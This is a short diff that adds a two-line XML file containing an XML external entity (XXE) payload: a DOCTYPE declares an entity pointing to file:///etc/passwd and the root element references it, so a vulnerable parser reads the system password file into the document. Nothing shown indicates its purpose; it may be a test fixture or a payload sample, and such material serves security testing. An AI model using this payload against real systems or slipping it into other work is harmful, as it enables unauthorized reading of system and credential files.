@@ -1,0 +1,2 @@
+<!DOCTYPE root [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
+<root>&secret;</root>
